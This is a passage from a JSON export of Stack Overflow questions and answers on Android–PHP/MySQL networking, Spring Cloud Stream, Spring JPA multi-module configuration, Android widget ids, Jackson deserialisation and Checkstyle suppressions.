a while loop). I think this is happening because at that moment when i try to parse the value, i don;t have a value in result. \r\n\r\nThe php code is:\r\n\r\n    &lt;?php\r\n    //connecting to database\r\n    $sql=mysql_query(&quot;select * from city where CITY_NAME like &#39;%&#39;&quot;);\r\n    $output = array();\r\n    while($row=mysql_fetch_assoc($sql)){\r\n        $output[]=$row;\r\n    }\r\n    \r\n    echo json_encode($output);\r\n    mysql_free_result($sql);\r\n    \r\n    ?&gt;\r\n\r\nTable &#39;city&#39; has two columns, CITY_ID and CITY_NAME.","title":"Android connecting to mysql through php","body":"<p>Thank you kabuto178, I'm made the changes and it's connecting. I've wrote the code also for retrieving data from mysql, so who need this, can use my example</p>\n\n<p>Here is the code:</p>\n\n<pre><code>package com.example.mycity;\n\n\nimport android.os.AsyncTask;\nimport android.os.Bundle;\nimport android.app.Activity;\n\n\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.util.ArrayList;\n\nimport org.apache.http.HttpEntity;\nimport org.apache.http.HttpResponse;\nimport org.apache.http.NameValuePair;\nimport org.apache.http.client.HttpClient;\nimport org.apache.http.client.entity.UrlEncodedFormEntity;\nimport org.apache.http.client.methods.HttpPost;\nimport org.apache.http.impl.client.DefaultHttpClient;\nimport org.json.JSONArray;\nimport org.json.JSONException;\nimport org.json.JSONObject;\n\nimport android.net.ParseException;\nimport android.util.Log;\nimport android.widget.TextView;\nimport android.widget.Toast;\n\npublic class MainActivity extends Activity {\n\nString result = \"\";\nInputStream is = null;\nStringBuilder sb=null;\n//String ct_name = null;\n\n@Override\npublic void onCreate(Bundle savedInstanceState) {\n\n\nsuper.onCreate(savedInstanceState);\nsetContentView(R.layout.activity_main);\nnew httprRequest().execute();\n\n\nint ct_id=0;\nString ct_name=\"\";\n\n//Toast.makeText(getBaseContext(), \"This is \"+result, 3000).show();\n\ntry {\nThread.sleep(1000L);\n} catch (Exception te) {}\n\ntry{\n    //ct_name = result;\n    JSONArray jArray = new JSONArray(result);\n\n    for(int i=0;i&lt;jArray.length();i++){\n           JSONObject json_data= jArray.getJSONObject(i);\n           ct_id=json_data.getInt(\"CITY_ID\");\n           ct_name += json_data.getString(\"CITY_NAME\")+\":\";\n       }\n\n    }\n    catch(JSONException e1){\n      e1.printStackTrace();\n    } catch (ParseException e1) {\n            e1.printStackTrace();\n    }\n\nTextView tv1 = (TextView) findViewById(R.id.textView1);\ntv1.setText(ct_name);\n\n}\n\nprivate class httprRequest extends AsyncTask&lt;String, Integer, String&gt;{\n\n    @Override \n    public String doInBackground(String... params){\nArrayList&lt;NameValuePair&gt; nameValuePairs = new ArrayList&lt;NameValuePair&gt;();\n//http post\ntry{\nHttpClient httpclient = new DefaultHttpClient();\nHttpPost httppost = new HttpPost(\"http://www.steagu.ro/android/city.php\");\nhttppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));\nHttpResponse response = httpclient.execute(httppost);\nif (response.getStatusLine().getStatusCode() != 200) {\n   Log.d(\"MyApp\", \"Server encountered an error.\");\n\n  }\nHttpEntity entity = response.getEntity();\nis = entity.getContent();\n}catch(Exception e){\n//e.printStackTrace();\nLog.e(\"log_tag\", \"Error in http connection: \"+e.toString());\n}\n\n//convert response to string\n\ntry{\n      BufferedReader reader = new BufferedReader(new InputStreamReader(is,\"iso-8859-1\"),8);\n       sb = new StringBuilder();\n       sb.append(reader.readLine() + \"\\n\");\n\n       String line=\"0\";\n       while ((line = reader.readLine()) != null) {\n                      sb.append(line + \"\\n\");\n        }\n        is.close();\n        result=sb.toString();\n}catch(Exception e){\n        //Toast.makeText(getBaseContext(), \"Am eroare aici\", 3000).show();\n        Log.e(\"log_tag\", \"Error converting result \"+e.toString());\n}\n\n\n/*\nToast.makeText(getBaseContext(), \"Here i am\", 3000).show();\n*/\n\nreturn result;\n    }\n\n  }\n\n}\n</code></pre>\n\n<p>I have to change a little bit the code, cause i put a thread.sleep. Instead of it, i have to check if i have a value into result (in a while loop). I think this is happening because at that moment when i try to parse the value, i don;t have a value in result. </p>\n\n<p>The php code is:</p>\n\n<pre><code>&lt;?php\n//connecting to database\n$sql=mysql_query(\"select * from city where CITY_NAME like '%'\");\n$output = array();\nwhile($row=mysql_fetch_assoc($sql)){\n    $output[]=$row;\n}\n\necho json_encode($output);\nmysql_free_result($sql);\n\n?&gt;\n</code></pre>\n\n<p>Table 'city' has two columns, CITY_ID and CITY_NAME.</p>\n"}],"owner":{"account_id":1971700,"reputation":19,"user_id":1770450,"accept_rate":50,"display_name":"Fcbrasov Romania"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1326,"favorite_count":0,"down_vote_count":2,"up_vote_count":0,"accepted_answer_id":13050840,"answer_count":3,"score":-2,"last_activity_date":1683725993,"creation_date":1351084692,"question_id":13050072,"body_markdown":"I&#39;m new to android and i would like to create an application that reads data from mysql server. [I&#39;ve taken from web an example about this][1], but i cannot make it work\r\n\r\nI&#39;m using eclipse for this and for the other part, php and mysql.\r\nFirst of all, here is my php script that is running ok ([city.php][2]): \r\n\r\n    &lt;?php\r\n    //connecting to database\r\n    $sql=mysql_query(&quot;select * from city&quot;);\r\n    $output = array();\r\n    while(list($id,$name)=mysql_fetch_array($sql)){\r\n        $output[$id]=$name;\r\n\r\n    }\r\n    print(json_encode($output));\r\n    mysql_free_result($sql);\r\n    \r\n    ?&gt;\r\n\r\nThis is returning:\r\n\r\n    {&quot;1&quot;:&quot;Brasov&quot;,&quot;2&quot;:&quot;Bucuresti&quot;}\r\n\r\nOn my android project from eclipse, I have in the MainActivity.java:\r\n\r\n    package com.example.mycity;\r\n    \r\n    \r\n    import android.os.Bundle;\r\n    import android.app.Activity;\r\n    \r\n    \r\n    import java.io.BufferedReader;\r\n    import java.io.InputStream;\r\n    import java.io.InputStreamReader;\r\n    import java.util.ArrayList;\r\n    \r\n    import org.apache.http.HttpEntity;\r\n    import org.apache.http.HttpResponse;\r\n    import org.apache.http.NameValuePair;\r\n    import org.apache.http.client.HttpClient;\r\n    import org.apache.http.client.entity.UrlEncodedFormEntity;\r\n    import org.apache.http.client.methods.HttpPost;\r\n    import org.apache.http.impl.client.DefaultHttpClient;\r\n    import org.json.JSONArray;\r\n    import org.json.JSONException;\r\n    import org.json.JSONObject;\r\n    \r\n    import android.net.ParseException;\r\n    import android.util.Log;\r\n    import android.widget.Toast;\r\n    \r\n    public class MainActivity extends Activity {\r\n    \r\n    JSONArray jArray;\r\n    String result = null;\r\n    InputStream is = null;\r\n    StringBuilder sb=null;\r\n    \r\n    @Override\r\n    public void onCreate(Bundle savedInstanceState) {\r\n    \r\n    \t\r\n    super.onCreate(savedInstanceState);\r\n    setContentView(R.layout.activity_main);\r\n    \r\n     ArrayList&lt;NameValuePair&gt; nameValuePairs = new ArrayList&lt;NameValuePair&gt;();\r\n    //http post\r\n    try{\r\n         HttpClient httpclient = new DefaultHttpClient();\r\n         HttpPost httppost = new HttpPost(&quot;http://www.steagu.ro/android/city.php&quot;);\r\n         httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));\r\n         HttpResponse response = httpclient.execute(httppost);\r\n         if (response.getStatusLine().getStatusCode() != 200) {\r\n        \t    Log.d(&quot;MyApp&quot;, &quot;Server encountered an error.&quot;);\r\n        \t    \r\n         }\r\n         HttpEntity entity = response.getEntity();\r\n         is = entity.getContent();\r\n         }catch(Exception e){\r\n        \t //e.printStackTrace();\r\n             Log.e(&quot;log_tag&quot;, &quot;Error in http connection: &quot;+e.toString());\r\n        }\r\n    \r\n      }\r\n    \r\n    \r\n    }\r\n\r\nBut when I&#39;m running this, I receive an error on logcat:it&#39;s not connecting to the file:Error in http connection: android.os.NetworkOnMainThreadException\r\n\r\n    10-24 13:04:34.429: I/dalvikvm(982): threadid=3: reacting to signal 3\r\n    10-24 13:04:34.649: I/dalvikvm(982): Wrote stack traces to &#39;/data/anr/traces.txt&#39;\r\n    10-24 13:04:34.859: E/log_tag(982): Error in http connection: android.os.NetworkOnMainThreadException\r\n    10-24 13:04:34.919: I/dalvikvm(982): threadid=3: reacting to signal 3\r\n    10-24 13:04:34.949: I/dalvikvm(982): Wrote stack traces to &#39;/data/anr/traces.txt&#39;\r\n    10-24 13:04:35.151: D/gralloc_goldfish(982): Emulator without GPU emulation detected.\r\n    10-24 13:04:35.479: I/dalvikvm(982): threadid=3: reacting to signal 3\r\n    10-24 13:04:35.499: I/dalvikvm(982): Wrote stack traces to &#39;/data/anr/traces.txt&#39;\r\n\r\nI have permission for internet in the AndroidManifest.xml:\r\n\r\n    &lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;\r\n        package=&quot;com.example.mycity&quot;\r\n        android:versionCode=&quot;1&quot;\r\n        android:versionName=&quot;1.0&quot; &gt;\r\n    \r\n        &lt;uses-sdk\r\n            android:minSdkVersion=&quot;8&quot;\r\n            android:targetSdkVersion=&quot;15&quot; /&gt;\r\n    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;&gt;&lt;/uses-permission&gt;\r\n    &lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot;&gt;&lt;/uses-permission&gt;\r\n    &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;&gt;&lt;/uses-permission&gt;\r\n    \r\n        &lt;application\r\n            android:icon=&quot;@drawable/ic_launcher&quot;\r\n            android:label=&quot;@string/app_name&quot;\r\n            android:theme=&quot;@style/AppTheme&quot; &gt;\r\n            &lt;activity\r\n                android:name=&quot;.MainActivity&quot;\r\n                android:label=&quot;@string/title_activity_main&quot; &gt;\r\n                &lt;intent-filter&gt;\r\n                    &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;\r\n    \r\n                    &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;\r\n                &lt;/intent-filter&gt;\r\n            &lt;/activity&gt;\r\n        &lt;/application&gt;\r\n    \r\n    &lt;/manifest&gt;\r\n\r\nI don&#39;t know where is the problem. Can anybody help me with this? Thank you!\r\n\r\n\r\n  [1]: http://blog.sptechnolab.com/2011/02/10/android/android-connecting-to-mysql-using-php/\r\n  [2]: http://steagu.ro/android/city.php","title":"Android connecting to mysql through php","body":"<p>I'm new to android and i would like to create an application that reads data from mysql server. <a href=\"http://blog.sptechnolab.com/2011/02/10/android/android-connecting-to-mysql-using-php/\" rel=\"nofollow\">I've taken from web an example about this</a>, but i cannot make it work</p>\n\n<p>I'm using eclipse for this and for the other part, php and mysql.\nFirst of all, here is my php script that is running ok (<a href=\"http://steagu.ro/android/city.php\" rel=\"nofollow\">city.php</a>): </p>\n\n<pre><code>&lt;?php\n//connecting to database\n$sql=mysql_query(\"select * from city\");\n$output = array();\nwhile(list($id,$name)=mysql_fetch_array($sql)){\n    $output[$id]=$name;\n\n}\nprint(json_encode($output));\nmysql_free_result($sql);\n\n?&gt;\n</code></pre>\n\n<p>This is returning:</p>\n\n<pre><code>{\"1\":\"Brasov\",\"2\":\"Bucuresti\"}\n</code></pre>\n\n<p>On my android project from eclipse, I have in the MainActivity.java:</p>\n\n<pre><code>package com.example.mycity;\n\n\nimport android.os.Bundle;\nimport android.app.Activity;\n\n\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.util.ArrayList;\n\nimport org.apache.http.HttpEntity;\nimport org.apache.http.HttpResponse;\nimport org.apache.http.NameValuePair;\nimport org.apache.http.client.HttpClient;\nimport org.apache.http.client.entity.UrlEncodedFormEntity;\nimport org.apache.http.client.methods.HttpPost;\nimport org.apache.http.impl.client.DefaultHttpClient;\nimport org.json.JSONArray;\nimport org.json.JSONException;\nimport org.json.JSONObject;\n\nimport android.net.ParseException;\nimport android.util.Log;\nimport android.widget.Toast;\n\npublic class MainActivity extends Activity {\n\nJSONArray jArray;\nString result = null;\nInputStream is = null;\nStringBuilder sb=null;\n\n@Override\npublic void onCreate(Bundle savedInstanceState) {\n\n\nsuper.onCreate(savedInstanceState);\nsetContentView(R.layout.activity_main);\n\n ArrayList&lt;NameValuePair&gt; nameValuePairs = new ArrayList&lt;NameValuePair&gt;();\n//http post\ntry{\n     HttpClient httpclient = new DefaultHttpClient();\n     HttpPost httppost = new HttpPost(\"http://www.steagu.ro/android/city.php\");\n     httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));\n     HttpResponse response = httpclient.execute(httppost);\n     if (response.getStatusLine().getStatusCode() != 200) {\n            Log.d(\"MyApp\", \"Server encountered an error.\");\n\n     }\n     HttpEntity entity = response.getEntity();\n     is = entity.getContent();\n     }catch(Exception e){\n         //e.printStackTrace();\n         Log.e(\"log_tag\", \"Error in http connection: \"+e.toString());\n    }\n\n  }\n\n\n}\n</code></pre>\n\n<p>But when I'm running this, I receive an error on logcat:it's not connecting to the file:Error in http connection: android.os.NetworkOnMainThreadException</p>\n\n<pre><code>10-24 13:04:34.429: I/dalvikvm(982): threadid=3: reacting to signal 3\n10-24 13:04:34.649: I/dalvikvm(982): Wrote stack traces to '/data/anr/traces.txt'\n10-24 13:04:34.859: E/log_tag(982): Error in http connection: android.os.NetworkOnMainThreadException\n10-24 13:04:34.919: I/dalvikvm(982): threadid=3: reacting to signal 3\n10-24 13:04:34.949: I/dalvikvm(982): Wrote stack traces to '/data/anr/traces.txt'\n10-24 13:04:35.151: D/gralloc_goldfish(982): Emulator without GPU emulation detected.\n10-24 13:04:35.479: I/dalvikvm(982): threadid=3: reacting to signal 3\n10-24 13:04:35.499: I/dalvikvm(982): Wrote stack traces to '/data/anr/traces.txt'\n</code></pre>\n\n<p>I have permission for internet in the AndroidManifest.xml:</p>\n\n<pre><code>&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    package=\"com.example.mycity\"\n    android:versionCode=\"1\"\n    android:versionName=\"1.0\" &gt;\n\n    &lt;uses-sdk\n        android:minSdkVersion=\"8\"\n        android:targetSdkVersion=\"15\" /&gt;\n&lt;uses-permission android:name=\"android.permission.INTERNET\"&gt;&lt;/uses-permission&gt;\n&lt;uses-permission android:name=\"android.permission.ACCESS_WIFI_STATE\"&gt;&lt;/uses-permission&gt;\n&lt;uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"&gt;&lt;/uses-permission&gt;\n\n    &lt;application\n        android:icon=\"@drawable/ic_launcher\"\n        android:label=\"@string/app_name\"\n        android:theme=\"@style/AppTheme\" &gt;\n        &lt;activity\n            android:name=\".MainActivity\"\n            android:label=\"@string/title_activity_main\" &gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"android.intent.action.MAIN\" /&gt;\n\n                &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt;\n            &lt;/intent-filter&gt;\n        &lt;/activity&gt;\n    &lt;/application&gt;\n\n&lt;/manifest&gt;\n</code></pre>\n\n<p>I don't know where is the problem. Can anybody help me with this? Thank you!</p>\n"},{"tags":["java","apache-kafka","spring-kafka","spring-cloud-stream","spring-cloud-stream-binder-kafka"],"answers":[{"tags":[],"owner":{"account_id":1288095,"reputation":169316,"user_id":1240763,"display_name":"Gary Russell"},"down_vote_count":0,"up_vote_count":0,"is_accepted":true,"score":0,"last_activity_date":1683725859,"creation_date":1683725859,"answer_id":76219126,"question_id":76219072,"body_markdown":"The test binder is exactly that; it is not a &quot;test Kafka&quot; binder; it is generic.\r\n\r\nIt is generally better to use the real binder for tests, with an embedded broker, or TestContainers.","title":"Spring Cloud Stream Test Binder does not populate topic header","body":"<p>The test binder is exactly that; it is not a &quot;test Kafka&quot; binder; it is generic.</p>\n<p>It is generally better to use the real binder for tests, with an embedded broker, or TestContainers.</p>\n"}],"owner":{"account_id":12541958,"reputation":139,"user_id":9126612,"display_name":"Karthik"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":53,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":76219126,"answer_count":1,"score":0,"last_activity_date":1683725859,"creation_date":1683725520,"question_id":76219072,"body_markdown":"When a message is consumed from the Spring Cloud Stream test binder, the following header is not populated:\r\n\r\n`kafka_receivedTopic`\r\n\r\nBut when I connect to an actual kafka broker, it&#39;s populated.\r\n\r\nIs there a way to get the topic in the consumer.\r\n\r\nMy consumer:\r\n\r\n```java\r\n@Bean\r\npublic Consumer&lt;Message&lt;PlaneEvent&gt;&gt; planeEventConsumer() {\r\n    return event -&gt; {\r\n        // do something\r\n    };\r\n}\r\n```","title":"Spring Cloud Stream Test Binder does not populate topic header","body":"<p>When a message is consumed from the Spring Cloud Stream test binder, the following header is not populated:</p>\n<p><code>kafka_receivedTopic</code></p>\n<p>But when I connect to an actual kafka broker, it's populated.</p>\n<p>Is there a way to get the topic in the consumer.</p>\n<p>My consumer:</p>\n<pre class=\"lang-java prettyprint-override\"><code>@Bean\npublic Consumer&lt;Message&lt;PlaneEvent&gt;&gt; planeEventConsumer() {\n    return event -&gt; {\n        // do something\n    };\n}\n</code></pre>\n"},{"tags":["java","spring","spring-boot","jpa","spring-repositories"],"answers":[{"tags":[],"owner":{"account_id":19635795,"reputation":116,"user_id":14373099,"display_name":"JavaProScript"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1644492583,"creation_date":1644492583,"answer_id":71064317,"question_id":71064231,"body_markdown":"Two solutions I can think of:\r\n - 1: @EnableJpaRepositories accepts an array as parameter, pass it path.to.app.module.\r\n - 2: Use @EnableAutoConfiguration and spare yourself a lot of trouble.","title":"Spring - import jpa repositories from another module","body":"<p>Two solutions I can think of:</p>\n<ul>\n<li>1: @EnableJpaRepositories accepts an array as parameter, pass it path.to.app.module.</li>\n<li>2: Use @EnableAutoConfiguration and spare yourself a lot of trouble.</li>\n</ul>\n"},{"tags":[],"owner":{"account_id":24214505,"reputation":1,"user_id":18170587,"display_name":"Knewbit"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1644493346,"creation_date":1644493346,"answer_id":71064502,"question_id":71064231,"body_markdown":"The `boot` module must contain multi path lick this:\r\n\r\n&gt; @ComponentScan({&quot;path.to.common.module&quot;, &quot;path.to.app.module&quot;})","title":"Spring - import jpa repositories from another module","body":"<p>The <code>boot</code> module must contain multi path lick this:</p>\n<blockquote>\n<p>@ComponentScan({&quot;path.to.common.module&quot;, &quot;path.to.app.module&quot;})</p>\n</blockquote>\n"},{"tags":[],"owner":{"account_id":13945225,"reputation":55,"user_id":10070140,"display_name":"Vincenzo"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1644501867,"creation_date":1644501867,"answer_id":71066525,"question_id":71064231,"body_markdown":"I found [the solution][1] to my problem.\r\n\r\nI solved using `@AutoConfigurationPackage`\r\n\r\n```java\r\n@Configuration\r\n@AutoConfigurationPackage\r\n@ComponentScan(&quot;path.to.common.module&quot;)\r\npublic class OutboxJpaMessagingConfig {\r\n}\r\n```\r\n\r\n\r\n  [1]: https://github.com/spring-projects/spring-boot/issues/8134#issuecomment-276492150","title":"Spring - import jpa repositories from another module","body":"<p>I found <a href=\"https://github.com/spring-projects/spring-boot/issues/8134#issuecomment-276492150\" rel=\"nofollow noreferrer\">the solution</a> to my problem.</p>\n<p>I solved using <code>@AutoConfigurationPackage</code></p>\n<pre class=\"lang-java prettyprint-override\"><code>@Configuration\n@AutoConfigurationPackage\n@ComponentScan(&quot;path.to.common.module&quot;)\npublic class OutboxJpaMessagingConfig {\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":2427663,"reputation":337,"user_id":2119265,"display_name":"Elvynia"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683725607,"creation_date":1683725607,"answer_id":76219081,"question_id":71064231,"body_markdown":"I&#39;ve been using package list as argument, in both `@EntityScan` and `@EnableJpaRepositories`. It works fine (Spring Boot v2.2.5.RELEASE):\r\n\r\n```java\r\n@Configuration\r\n@EntityScan({ &quot;my.common.entity&quot;, &quot;my.app.entity&quot; })\r\n@EnableJpaRepositories({ &quot;my.common.repository&quot;, &quot;my.app.repository&quot; })\r\npublic class ExampleConfiguration {\r\n\r\n}\r\n```\r\n\r\nDid not see @Knewbit&#39;s answer before posting sorry seems redundant now.","title":"Spring - import jpa repositories from another module","body":"<p>I've been using package list as argument, in both <code>@EntityScan</code> and <code>@EnableJpaRepositories</code>. It works fine (Spring Boot v2.2.5.RELEASE):</p>\n<pre class=\"lang-java prettyprint-override\"><code>@Configuration\n@EntityScan({ &quot;my.common.entity&quot;, &quot;my.app.entity&quot; })\n@EnableJpaRepositories({ &quot;my.common.repository&quot;, &quot;my.app.repository&quot; })\npublic class ExampleConfiguration {\n\n}\n</code></pre>\n<p>Did not see @Knewbit's answer before posting sorry seems redundant now.</p>\n"}],"owner":{"account_id":13945225,"reputation":55,"user_id":10070140,"display_name":"Vincenzo"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":3179,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":4,"score":1,"last_activity_date":1683725607,"creation_date":1644492241,"question_id":71064231,"body_markdown":"I have two gradle modules: `common` and `app`\r\n\r\nThe `common` module contains a JpaRepository named `OutboxJpaMessageRepository`.\r\n\r\nThe `app` module contains another JpaRepository named `RentRepository`.\r\n\r\nThe `common` has the following configuration class, which is auto-imported by the other module (using a `spring.factories` file):\r\n```java\r\n@Configuration\r\n@EntityScan(&quot;path.to.common.module&quot;)\r\n@EnableJpaRepositories(&quot;path.to.common.module&quot;)\r\n@ComponentScan(&quot;path.to.common.module&quot;)\r\npublic class OutboxMessagingAutoConfig {\r\n}\r\n```\r\n\r\nThe problem is that `@EnableJpaRepositories(&quot;path.to.common.module&quot;)` overrides the default auto-configuration of the application, and the app can&#39;t find `RentRepository` (different package).\r\n\r\nCan a library exports jpa repositories without override the default configuration of the client?\r\n\r\nI don&#39;t want to re-configure all apps which use the common module","title":"Spring - import jpa repositories from another module","body":"<p>I have two gradle modules: <code>common</code> and <code>app</code></p>\n<p>The <code>common</code> module contains a JpaRepository named <code>OutboxJpaMessageRepository</code>.</p>\n<p>The <code>app</code> module contains another JpaRepository named <code>RentRepository</code>.</p>\n<p>The <code>common</code> has the following configuration class, which is auto-imported by the other module (using a <code>spring.factories</code> file):</p>\n<pre class=\"lang-java prettyprint-override\"><code>@Configuration\n@EntityScan(&quot;path.to.common.module&quot;)\n@EnableJpaRepositories(&quot;path.to.common.module&quot;)\n@ComponentScan(&quot;path.to.common.module&quot;)\npublic class OutboxMessagingAutoConfig {\n}\n</code></pre>\n<p>The problem is that <code>@EnableJpaRepositories(&quot;path.to.common.module&quot;)</code> overrides the default auto-configuration of the application, and the app can't find <code>RentRepository</code> (different package).</p>\n<p>Can a library exports jpa repositories without override the default configuration of the client?</p>\n<p>I don't want to re-configure all apps which use the common module</p>\n"},{"tags":["java","android","widget","broadcastreceiver","android-widget"],"owner":{"account_id":10916684,"reputation":3936,"user_id":8024296,"display_name":"Paul"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":21,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1683725386,"creation_date":1683725066,"question_id":76218992,"body_markdown":"I would need to get the widget id inside the `BroadcastReceiver`.\r\n\r\nI&#39;m trying everything, below you see what I get.\r\n\r\nI also followed: https://stackoverflow.com/questions/18234750/get-widget-id-from-broadcastreceiver\r\n\r\nBut I don&#39;t understand what I&#39;m doing wrong.\r\n\r\nCan you give me a hand?\r\n\r\n```java\r\npublic class WidgetService extends BroadcastReceiver {\r\n    @Override\r\n    public void onReceive(Context context, Intent intent) {\r\n\r\n        int[] a = intent.getIntArrayExtra(AppWidgetManager.EXTRA_APPWIDGET_IDS);\r\n        int b = intent.getIntExtra(AppWidgetManager.EXTRA_APPWIDGET_ID, -1);\r\n        String c = intent.getStringExtra(AppWidgetManager.EXTRA_APPWIDGET_ID);\r\n        Log.d(&quot;a&quot;, String.valueOf(a));\r\n        Log.d(&quot;b&quot;, String.valueOf(b));\r\n        Log.d(&quot;c&quot;, String.valueOf(c));\r\n....\r\n```\r\n\r\n\r\nConsole:\r\n\r\n```\r\na   com.app.name   D  null\r\nb   com.app.name   D  -1\r\nc   com.app.name   D  null\r\n```","title":"Android java get the widget id inside the BroadcastReceiver","body":"<p>I would need to get the widget id inside the <code>BroadcastReceiver</code>.</p>\n<p>I'm trying everything, below you see what I get.</p>\n<p>I also followed: <a href=\"https://stackoverflow.com/questions/18234750/get-widget-id-from-broadcastreceiver\">Get widget id from BroadcastReceiver</a></p>\n<p>But I don't understand what I'm doing wrong.</p>\n<p>Can you give me a hand?</p>\n<pre class=\"lang-java prettyprint-override\"><code>public class WidgetService extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n\n        int[] a = intent.getIntArrayExtra(AppWidgetManager.EXTRA_APPWIDGET_IDS);\n        int b = intent.getIntExtra(AppWidgetManager.EXTRA_APPWIDGET_ID, -1);\n        String c = intent.getStringExtra(AppWidgetManager.EXTRA_APPWIDGET_ID);\n        Log.d(&quot;a&quot;, String.valueOf(a));\n        Log.d(&quot;b&quot;, String.valueOf(b));\n        Log.d(&quot;c&quot;, String.valueOf(c));\n....\n</code></pre>\n<p>Console:</p>\n<pre><code>a   com.app.name   D  null\nb   com.app.name   D  -1\nc   com.app.name   D  null\n</code></pre>\n"},{"tags":["java","spring","spring-boot","spring-mvc","jackson"],"owner":{"account_id":6676840,"reputation":2917,"user_id":5151202,"display_name":"times29"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":121,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":0,"score":1,"last_activity_date":1683725356,"creation_date":1683725356,"question_id":76219044,"body_markdown":"As the question states, I want the Jackson `ObjectMapper` to deserialize a JSON array into a mutable `List` like `ArrayList`.  \r\nCurrently, it is deserialized into an `ImmutableList`.  \r\nI use Spring Boot and would preferrably configure it via `application.yml`.\r\n","title":"Can I configure the Jackson ObjectMapper to deserialize JSON arrays into mutable collections instead of immutable ones?","body":"<p>As the question states, I want the Jackson <code>ObjectMapper</code> to deserialize a JSON array into a mutable <code>List</code> like <code>ArrayList</code>.<br />\nCurrently, it is deserialized into an <code>ImmutableList</code>.<br />\nI use Spring Boot and would preferrably configure it via <code>application.yml</code>.</p>\n"},{"tags":["java","windows","maven-2","netbeans","checkstyle"],"answers":[{"tags":[],"owner":{"account_id":35769,"reputation":2058,"user_id":101562,"accept_rate":77,"display_name":"Jon Strayer"},"down_vote_count":3,"up_vote_count":18,"is_accepted":true,"score":15,"last_activity_date":1390569252,"creation_date":1245356723,"answer_id":1015010,"question_id":997021,"body_markdown":"&lt;!-- language-all: xml --&gt;\r\n\r\nPut a newline at the end of the file&lt;br&gt;\r\nor&lt;br&gt;\r\nconfigure CheckStyle not to care.\r\n\r\n    &lt;module name=&quot;Checker&quot;&gt;\r\n        &lt;!-- stuff deleted --&gt;\r\n        &lt;module name=&quot;NewlineAtEndOfFile&quot;&gt;\r\n            &lt;property name=&quot;severity&quot; value=&quot;ignore&quot; /&gt;\r\n        &lt;/module&gt;\r\n\r\n----------\r\n\r\nYou also have to tell the Maven Checkstyle plugin to use your checkstyle config file.\r\n\r\n    &lt;plugin&gt;\r\n        &lt;artifactId&gt;maven-checkstyle-plugin&lt;/artifactId&gt;\r\n        &lt;configuration&gt;\r\n            &lt;configLocation&gt;${basedir}/yourCheckstyle.xml&lt;/configLocation&gt;\r\n        &lt;/configuration&gt;\r\n    &lt;/plugin&gt;\r\n","title":"How to get rid of Checkstyle message &#39;File does not end with a newline.&#39;","body":"\n\n<p>Put a newline at the end of the file<br>\nor<br>\nconfigure CheckStyle not to care.</p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;module name=\"Checker\"&gt;\n    &lt;!-- stuff deleted --&gt;\n    &lt;module name=\"NewlineAtEndOfFile\"&gt;\n        &lt;property name=\"severity\" value=\"ignore\" /&gt;\n    &lt;/module&gt;\n</code></pre>\n\n<hr>\n\n<p>You also have to tell the Maven Checkstyle plugin to use your checkstyle config file.</p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;plugin&gt;\n    &lt;artifactId&gt;maven-checkstyle-plugin&lt;/artifactId&gt;\n    &lt;configuration&gt;\n        &lt;configLocation&gt;${basedir}/yourCheckstyle.xml&lt;/configLocation&gt;\n    &lt;/configuration&gt;\n&lt;/plugin&gt;\n</code></pre>\n"},{"tags":[],"owner":{"account_id":88200,"reputation":41,"user_id":244114,"display_name":"Stuart Jones"},"down_vote_count":0,"up_vote_count":4,"is_accepted":false,"score":4,"last_activity_date":1390569797,"creation_date":1262710932,"answer_id":2007669,"question_id":997021,"body_markdown":"&lt;!-- language-all: xml --&gt;\r\n\r\nThere&#39;s a simpler way to do this. You can specify a suppressions file without overriding the sun checkstyle config file:\r\n\r\n    &lt;plugin&gt;\r\n        &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\r\n        &lt;artifactId&gt;maven-checkstyle-plugin&lt;/artifactId&gt;\r\n        &lt;configuration&gt;\r\n            &lt;suppressionsLocation&gt;suppressions.xml&lt;/suppressionsLocation&gt;\r\n            &lt;configLocation&gt;config/sun_checks.xml&lt;/configLocation&gt;\r\n        &lt;/configuration&gt;\r\n    &lt;/plugin&gt;\r\n\r\nWhere your suppressions.xml is:\r\n\r\n    &lt;?xml version=&quot;1.0&quot;?&gt;\r\n    &lt;!DOCTYPE suppressions PUBLIC\r\n        &quot;-//Puppy Crawl//DTD Suppressions 1.1//EN&quot;\r\n        